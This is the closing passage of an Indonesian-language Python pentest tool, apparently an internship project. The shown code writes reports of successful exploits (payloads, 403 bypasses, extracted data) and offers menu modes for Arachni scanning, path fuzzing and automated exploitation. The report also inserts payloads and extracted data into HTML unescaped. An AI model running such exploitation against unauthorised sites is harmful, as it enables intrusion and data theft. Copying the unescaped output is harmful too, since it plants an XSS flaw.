    for idx, v in enumerate(web_vulns, 1):
        html += f"<tr class='severity-{v['severity'].lower()}'><td>{idx}</td><td>{v['nama']}</td><td>{v['url']}</td><td>{v.get('parameter', 'N/A')}</td><td>{v['severity']}</td><td>{v.get('cwe', 'N/A')}</td></tr>"
    html += "</table>"

    html += """
        <h3>Bukti Konsep (Proof of Concept) - Eksploitasi Berhasil</h3>
"""
    if hasil_eksploit:
        for p in hasil_eksploit:
            html += f"""
            <div style="background-color: #e8f5e8; padding: 10px; margin-bottom: 10px; border-left: 5px solid #4CAF50;">
                <strong>Teknik:</strong> {p.get('teknik', 'N/A')}<br>
                <strong>Bypass:</strong> {p.get('bypass', 'N/A')}<br>
                <strong>Payload:</strong> <code>{p.get('payload', 'N/A')}</code><br>
                <strong>URL:</strong> <a href="{p.get('url', '#')}" target="_blank">{p.get('url', '')}</a><br>
                <strong>Data Terekstrak:</strong> <pre>{p.get('data', '')}</pre>
            </div>
            """
    else:
        html += "<p>Tidak ada eksploitasi yang berhasil.</p>"

    html += f"""
        <h2>REKOMENDASI PERBAIKAN</h2>
        <ul>
            <li>Gunakan query terparameter untuk mencegah SQL Injection.</li>
            <li>Terapkan validasi input dan encoding output untuk mencegah XSS.</li>
            <li>Hindari penggunaan fungsi sistem yang tidak aman; gunakan API yang aman.</li>
            <li>Batasi akses file dan gunakan whitelist untuk LFI.</li>
            <li>Validasi tipe dan konten file upload; simpan di luar webroot.</li>
        </ul>

        <h2>DETAIL TEKNIS</h2>
        <p>Lokasi laporan: {DIR_LAPORAN}/</p>
        <p>Laporan web (HTML): ekstrak {DIR_WEB}/laporan.html.zip</p>
        <p>Log eksploitasi: {LOG_EKSPLOIT}</p>

        <div class="footer">
            Laporan dihasilkan secara otomatis oleh Assessment Tool (Web Only)<br>
            &copy; 2025 - Project-Based Internship Vinix7
        </div>
    </div>
</body>
</html>
"""

    with open(REPORT_HTML, 'w', encoding='utf-8') as f:
        f.write(html)

    # Juga simpan teks dan JSON
    with open(f"{DIR_LAPORAN}/laporan_akhir.txt", 'w', encoding='utf-8') as f:
        f.write(html)

    json_laporan = {
        'waktu': datetime.now().isoformat(),
        'semua_isu_web': semua_isu,
        'kerentanan_web_tinggi': web_vulns,
        'eksploit_berhasil': hasil_eksploit
    }
    with open(f"{DIR_LAPORAN}/laporan_akhir.json", 'w', encoding='utf-8') as f:
        json.dump(json_laporan, f, indent=2, default=str)

    catat_log(f"Laporan HTML tersimpan di {REPORT_HTML}")
    print("\n" + "="*60)
    print("RINGKASAN LAPORAN (WEB ONLY):")
    print(f"  Semua temuan web: {len(semua_isu)}")
    print(f"  Kerentanan Web High/Critical: {len(web_vulns)}")
    print(f"  Eksploitasi Berhasil: {len(hasil_eksploit)}")
    print(f"  Laporan HTML: {REPORT_HTML}")
    print("="*60)

# ==================== MENU INTERAKTIF ====================
def tampilkan_menu():
    print("\n" + "="*60)
    print("   VULNERABILITY ASSESSMENT TOOL (WEB ONLY) - AGGRESSIVE")
    print("="*60)
    print("Pilih mode eksekusi:")
    print("1. Scan dengan Arachni saja")
    print("2. Eksploitasi manual pada semua URL")
    print("3. Scan Arachni + Eksploitasi manual (jika ada high/critical)")
    print("4. Mode Agresif: Bypass 403 + Fuzzing + Eksploitasi manual")
    print("5. Keluar")
    pilihan = input("Masukkan pilihan [1-5]: ").strip()
    return pilihan

def run_arachni_only():
    catat_log("=== MODE: SCAN ARACHNI SAJA ===")
    if not periksa_arachni():
        return None, None, None
    laporan_json = jalankan_scan_arachni()
    if not laporan_json:
        return None, None, None
    semua = ekstrak_semua_isu(laporan_json)
    tinggi = ekstrak_kerentanan_tinggi(laporan_json)
    return semua, tinggi, []

def run_exploit_only():
    catat_log("=== MODE: EKSPLOITASI MANUAL SAJA ===")
    semua, tinggi = [], []
    hasil = manual_exploit_all_urls(use_bypass=False)
    return semua, tinggi, hasil

def run_both():
    catat_log("=== MODE: SCAN ARACHNI + EKSPLOITASI ===")
    if not periksa_arachni():
        return None, None, None
    laporan_json = jalankan_scan_arachni()
    if not laporan_json:
        return None, None, None
    semua = ekstrak_semua_isu(laporan_json)
    tinggi = ekstrak_kerentanan_tinggi(laporan_json)
    if tinggi:
        hasil = lakukan_eksploitasi(tinggi)
    else:
        hasil = []
    return semua, tinggi, hasil

def run_aggressive():
    catat_log("=== MODE: AGGRESSIVE (BYPASS + FUZZING + EXPLOIT) ===")
    # Kumpulkan semua URL awal
    urls = set(URL_LIST)
    # Dapatkan domain
    parsed = urllib.parse.urlparse(BASE_URL)
    domain = f"{parsed.scheme}://{parsed.netloc}"
    # Fuzzing path
    catat_log("Melakukan fuzzing path pada domain...")
    found = fuzz_paths(domain)
    for f in found:
        urls.add(f)
    # Sekarang jalankan eksploitasi pada semua URL (gunakan bypass)
    hasil_eksploit = []
    for url in urls:
        res = process_single_url(url, use_bypass=True)
        hasil_eksploit.extend(res)
    return [], [], hasil_eksploit

# ==================== EKSEKUSI UTAMA ====================
def main():
    print("""
    ╔══════════════════════════════════════════════════════════╗
    ║     AGGRESSIVE WEB VULNERABILITY ASSESSMENT TOOL        ║
    ║              (Bypass 403 + Fuzzing + Exploit)           ║
    ╚══════════════════════════════════════════════════════════╝
    """)

    while True:
        pilihan = tampilkan_menu()
        if pilihan == '5':
            print("Keluar dari program.")
            break

        waktu_mulai = time.time()
        catat_log("=== PENILAIAN DIMULAI ===")
        with open(LOG_EKSPLOIT, 'w') as f:
            f.write(f"Log Eksploitasi - {datetime.now().isoformat()}\n{'='*50}\n")

        if pilihan == '1':
            semua, tinggi, hasil = run_arachni_only()
        elif pilihan == '2':
            semua, tinggi, hasil = run_exploit_only()
        elif pilihan == '3':
            semua, tinggi, hasil = run_both()
        elif pilihan == '4':
            semua, tinggi, hasil = run_aggressive()
        else:
            print("Pilihan tidak valid.")
            continue

        if semua is None:
            continue

        catat_log("=== MEMBUAT LAPORAN ===")
        buat_laporan(semua, tinggi, hasil)

        waktu_selesai = time.time() - waktu_mulai
        catat_log(f"=== PENILAIAN SELESAI dalam {waktu_selesai/60:.2f} menit ===")
        print("\nLaporan tersimpan di folder:", DIR_LAPORAN)
        input("Tekan Enter untuk kembali ke menu...")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        catat_log("Dihentikan pengguna", "WARNING")
        sys.exit(0)
    except Exception as e:
        catat_log(f"Kesalahan fatal: {e}", "ERROR")
        import traceback
        traceback.print_exc()
        sys.exit(1)
